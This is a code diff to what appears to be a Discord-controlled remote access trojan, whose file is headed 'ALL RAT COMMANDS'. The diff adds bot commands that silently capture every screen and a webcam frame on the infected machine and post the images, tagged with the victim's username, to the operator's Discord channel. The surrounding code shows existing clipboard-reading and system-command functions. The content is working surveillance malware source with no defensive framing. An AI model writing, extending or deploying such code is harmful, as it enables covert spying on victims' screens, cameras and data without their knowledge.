@@ -18,6 +18,9 @@ import re
 import textwrap
 import pwd
 import clipboard
+import functools
+import PIL
+import cv2
 
 from src.database.manager import main as db_main
 
@@ -72,9 +75,8 @@ async def on_message(message):
 # ALL RAT COMMANDS
 # --------------------------------------------------------------
 
+
 # Support
-
-
 def run_system_command(command: list, show: bool = True):
     p = subprocess.run(command, capture_output=True, text=True)
     code, out, err = p.returncode, p.stdout, p.stderr
@@ -1010,6 +1012,63 @@ async def clipboard(ctx):
                 icon_url=ctx.author.avatar_url
             )
             await ctx.send(embed=embed)
+    except Exception as e:
+        await ctx.send(str(e))
+
+
+@client.command()
+async def screenshot(ctx):
+    try:
+        PIL.ImageGrab.grab = functools.partial(
+            PIL.ImageGrab.grab, all_screens=True)
+        myScreenshot = pyautogui.screenshot()
+        myScreenshot.save(r'temp.png')
+        file = discord.File('temp.png', filename="temp.png")
+
+        embed = discord.Embed(
+            title=f"Screenshot {getpass.getuser()}'s Screen",
+            description="",
+            timestamp=datetime.utcnow(),
+            color=0xFF5733
+        )
+        embed.set_image(url="attachment://temp.png")
+        embed.set_footer(
+            text=f'Requested by {ctx.author.name}',
+            icon_url=ctx.author.avatar_url
+        )
+        await ctx.send(file=file, embed=embed)
+
+        os.remove("temp.png")
+
+    except Exception as e:
+        await ctx.send(str(e))
+        return
+
+
+@client.command()
+async def webcam(ctx):
+    try:
+        camera = cv2.VideoCapture(0)
+        return_value, image = camera.read()
+        cv2.imwrite("temp.png", image)
+        del(camera)
+        file = discord.File('temp.png', filename="temp.png")
+
+        embed = discord.Embed(
+            title=f"Webcam of {getpass.getuser()}",
+            description="",
+            timestamp=datetime.utcnow(),
+            color=0xFF5733
+        )
+        embed.set_image(url="attachment://temp.png")
+        embed.set_footer(
+            text=f'Requested by {ctx.author.name}',
+            icon_url=ctx.author.avatar_url
+        )
+        await ctx.send(file=file, embed=embed)
+
+        os.remove("temp.png")
+
     except Exception as e:
         await ctx.send(str(e))
 
